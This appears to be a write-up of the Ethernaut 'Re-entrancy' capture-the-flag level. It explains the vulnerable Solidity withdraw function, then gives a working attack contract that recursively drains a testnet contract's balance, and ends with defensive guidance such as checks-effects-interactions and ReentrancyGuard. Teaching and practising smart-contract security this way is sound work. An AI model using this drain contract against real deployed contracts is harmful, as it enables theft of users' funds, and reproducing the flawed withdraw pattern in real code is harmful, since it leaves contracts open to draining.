# Re-entrancy

![https://ethernaut.openzeppelin.com/imgs/BigLevel10.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel10.svg)

# Objectives

The goal of this level is for you to steal all the funds from the contract.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.
- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

# Re-entrancy Attack

Let’s say we have two contract `A` and `B`.  And contract A can call contract B. The basic and most simple idea of re-entrancy attack is that, while contract A is calling the contract B, contract B can call back into contract A while contract A’s call is still executing. Let’s break it even more.

Let’s say contract `A` has `10 Ethers` and contract `B` has `0 Ethers`. Contract A holds the balance record of how much other contracts or addresses has deposited into the contract, and Contract `B` has a balance of `1 Ether` in contract `A`. 

So, contract `A` also has a function or method that let’s other addresses withdraw `Ether` from the contract if that address has deposited `ether` previously. This is how the contract `A` should look like - 

```solidity
// Contract A

Balance - 10 Ether
Balance of Alice - 1 Ether

// withdraw function
function withdraw() {
	check balance of the msg.sender > 0
	send Ether to msg.sender
	balance = 0  // update the balance of msg.sender
```

So what happens here in this method is that, when `Alice` calls the `withdraw()` method on contract A, 

1. it will first check if Alice has more than 0 Ether deposited in the contract balance. 
2. If yes, it will send the deposited amount to Alice’s address and, the total balance of contract A becomes (`10 - 1 = 9`) 9 Ether
3. It will update the balance of Alice’s deposit in the contract

So how can we exploit this `withdraw()` method using the contract `B`?

Contract B has to have two functions, a function that calls the `withdraw()` function of contract A and another function which will be a `fallback()` function that will recursively call the `withdraw()` function again and again until contract A’s balance is drained out.

Here’s how contract B should look like - 

```solidity
// Contract B
Balance - 0 Ether

fallback() {
	A.withdraw()
}

function attack() {
	A.withdraw()
}
```

The way Re-Entrancy Attack is working here is that - 

1. Let’s assume Contract B has deposited `1 Ether` to Contract A’s address.
2. Contract B calls `attack()` function which calls the Contract A’s `withdraw()` function.
3. Contract A checks the if balance of Contract B is greater than 0
4. Since it is greater than 0, Contract A will send the `Ether` to Contract B
5. And when contract A sends the Ether to contract B, inside contract B it will trigger the `fallback()` function.
6. At this point, Contract B has `1 Ether` and Contract A has `9 Ether`
7. Fallback function will then again call the Contract A’s `withdraw()` function.
8. Contract A’s `withdraw()` again checks if the balance of Contract B is greater than 0
9. Notice that, `withdraw()` function yet to update the balance of Contract B after the sending the Ether in STEP 5, for this reason, the balance of Contract B in Contract A is still `1 Ether` and greater than 0.
10. Contract A again sends `1 Ether` to Contract B, this agains invokes the `fallback()` of contract B
11. This recursive calls continues till the balance of contract A is empty.

This can happen because the balance of contract A is being updated after it has send the Ether. A better expiation of the Re-entrancy attack can be found in this video by Smart Contract Programmer - 

[https://www.youtube.com/watch?v=4Mm3BCyHtDY](https://www.youtube.com/watch?v=4Mm3BCyHtDY)

# Analysis

This challenge introduces us to the famous Re-entrancy attack. We tried to understand what Re-entrance attack is and how it can be achieved. Now let’s take a loot at the vulnerable function - `withdraw()` - 

```solidity
function withdraw(uint _amount) public {
  if(balances[msg.sender] >= _amount) {
    (bool result,) = msg.sender.call{value:_amount}("");
    if(result) {
      _amount;
    }
    balances[msg.sender] -= _amount;
  }
}
```

This function is taking some Ether in `_amount` and making sure that the balance of the user who initiated the function call should be greater than or equal to the amount.

It is then making an external call to `msg.sender`'s address. This is a big RED FLAG as this address can be controlled by our user since we are the `msg.sender`.

After the external call, the function is then updating the balance for our user in the mapping `balances[msg.sender]`. Since this is happening after the external call, we can exploit this behavior so that the function never reaches this line to update user balance.

There's another function called `donate()` - 

```solidity
function donate(address _to) public payable {
  balances[_to] = balances[_to].add(msg.value);
}
```

This function deposits the Ether to the address supplied in the function arguments. We will need to call this so that we are able to validate the `if` condition in the `withdraw()` function - `if(balances[msg.sender] >= _amount)`.

# AntiSec

To exploit this contract, I will use `RemixIDE` to write another malicious contract which will have one `fallback()` function and one `attack()` function.

`attack()` function will first deposit some ether to the victim contract to bypass the `balances[msg.sender] >= _amount` check using victim contract’s `donate()` function and after that `attack()` will again call the victim contract’s `withdraw()` function with the amount that has been deposited in the previous call.

When the victim contract will send the deposited Ether to our malicious contract, it will automatically invoked the fallback `receive()` function which will recursively call the victim’s `withdraw()` function again until the victim’s contract balance is 0.

Before I attack the contract, a quick search on the goerli etherscan to check the balance of this `Reentrance` contract tells us that it has `0.001` ETH. This is the amount we will send to the victim contract and after the attack our malicious contract should have `0.002 ETH` as balance.

![Screenshot 2023-02-20 at 12.52.33 AM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a50b7724-33fb-4e5a-862f-748e8c933a89/Screenshot_2023-02-20_at_12.52.33_AM.png)

Here’s the Attack Contract - 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint) external;
}

contract Attack {
    IReentrance reentrance = IReentrance(0x0cd998bf24F8eC1bDc2aDCF4AE3DF88dCc1a91a0);

    constructor() public {}

    function attack() external payable {
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        uint amount = min(0.001 ether, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(0.001 ether);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
```

Once the attack is completed, the victim’s contract balance should be zero - 

![Screenshot 2023-02-20 at 3.07.16 AM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ef33eadb-ff34-4ae3-9efe-b982a143963c/Screenshot_2023-02-20_at_3.07.16_AM.png)

And if we check our malicious contract address, it should have `0.002 ETH` - 

![Screenshot 2023-02-20 at 3.08.50 AM.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/078657f0-71bd-4327-8132-ef333d9c2770/Screenshot_2023-02-20_at_3.08.50_AM.png)

Now submit the instance to pass the level.

# Key Takeaways

In order to prevent re-entrancy attacks when moving funds out of your contract, use the [Checks-Effects-Interactions pattern](https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern) being aware that `call` will only return false without interrupting the execution flow. Solutions such as [ReentrancyGuard](https://docs.openzeppelin.com/contracts/2.x/api/utils#ReentrancyGuard) or [PullPayment](https://docs.openzeppelin.com/contracts/2.x/api/payment#PullPayment) can also be used.

`transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork [Source 1](https://diligence.consensys.net/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742).

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and *re-enter* your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!

### The DAO Hack

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
